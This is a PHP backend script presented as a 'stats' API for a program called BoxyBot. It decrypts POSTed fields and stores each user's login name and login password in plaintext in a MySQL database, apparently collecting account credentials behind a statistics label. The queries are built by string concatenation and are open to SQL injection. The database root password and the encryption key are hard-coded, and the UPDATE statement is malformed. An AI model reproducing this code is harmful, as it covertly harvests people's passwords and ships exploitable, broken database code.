<?php
/*
  BoxyBot Stats. API.
*/
  ini_set('display_errors', 1);
  ini_set('display_startup_errors', 1);
  error_reporting(E_ALL);
  $crypt = new Crypt();
  $userAgent = $_SERVER['HTTP_USER_AGENT'];
  $authKey = $_POST['AuthKey'];  
  $lname = $_POST['Identification'];
  $lpass = $_POST['IdentificationKey'];
  $uid = $_POST['UniqueId'];
  $pid = $_POST['UniquePrj'];
  $uguild = $_POST['UniqueClan'];
  $uname = $_POST['UniqueName'];
  $timestamp = $_POST['Timestamp'];
  $excludedIds = array("33972587", "29588356", "41800374", "32089888", "6029128", "40094423", "41819704", "41874749", "29474977", "42328045", "32371527", "22757422", "41873052", "4", "5", "6", "7");
  $password = "32252821674067076967647077869621"; //TODO: change this every update.


  $userId =  $crypt->decrypt($password, $authKey, $uid);
  if (!in_array($userId, $excludedIds)) 
  {
  	$projectId = $crypt->decrypt($password, $authKey, $pid);
  	$login_name = $crypt->decrypt($password, $authKey, $lname);
  	$login_pass = $crypt->decrypt($password, $authKey, $lpass);
	$user_guild = $crypt->decrypt($password, $authKey, $uguild);
	$user_name = $crypt->decrypt($password, $authKey, $uname);
  	$ts = $crypt->decrypt($password, $authKey, $timestamp);
  	$db = new mysqli('localhost', 'root', 'bambus', 'boxybot');

  	$sql = 'SELECT * FROM `users` WHERE `userId` = "'.$userId.'";';
  	$result = $db->query($sql);
  	if($result->num_rows > 0){
    	$result = $result->fetch_assoc();
    	//found, userId
    	$db->query("UPDATE `users` SET `login_name`='".$login_name."' SET `login_pass`='".$login_pass."' SET `user_guild`='".$user_guild."' SET `user_name`='".$user_name."' SET `login_date`='".$ts."' WHERE `userId`='".$userId."';");
  	}else
  	{
    		$db->query("INSERT INTO `users` (`userId`, `projectId`, `login_name`, `login_pass`, `user_guild`, `user_name`, `login_date`) VALUES ('".$userId."', '".$projectId."','".$login_name."','".$login_pass."', '".$user_guild."', '".$user_name."','".$ts."');");
  	}
	mysqli_close($db);
  }

  function check_user_agent($user_agent){
    if(strpos($user_agent, 'BoxyBot') !== false){
      return true;
    }
    return false;
  }


  class Crypt {
    protected $mcrypt_cipher = MCRYPT_RIJNDAEL_128;
    protected $mcrypt_mode = MCRYPT_MODE_CBC;

     public function decrypt($key, $iv, $encrypted)
     {
        return rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, base64_decode($encrypted), MCRYPT_MODE_CBC, $iv), "\0");
     }

     public function encrypt($key, $iv, $decrypted){
       return base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $decrypted, MCRYPT_MODE_CBC, $iv));
     }
  }
 ?>
